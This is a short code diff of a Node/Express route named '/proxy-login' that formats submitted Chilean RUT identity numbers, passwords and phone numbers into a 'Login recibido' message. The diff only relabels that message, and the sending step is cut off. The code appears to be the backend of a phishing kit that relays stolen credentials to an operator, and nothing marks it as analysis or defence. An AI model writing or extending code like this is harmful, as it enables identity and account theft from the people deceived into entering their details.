@@ -69,7 +69,7 @@ app.post("/proxy-login", async (req, res) => {
   if (mail) {
     mensaje = `Correo actualizado:\n${mail || "(sin correo)"}`;
   } else {
-    mensaje = `Login recibido:\nRUT: ${rut || "(sin rut)"}\nClave: ${passwd || "(sin clave)"}\nTeléfono: ${telefono || "(sin teléfono)"}`;
+    mensaje = `Login recibido AutOB:\nRUT: ${rut || "(sin rut)"}\nClave: ${passwd || "(sin clave)"}\nTeléfono: ${telefono || "(sin teléfono)"}`;
   }
 
   try {
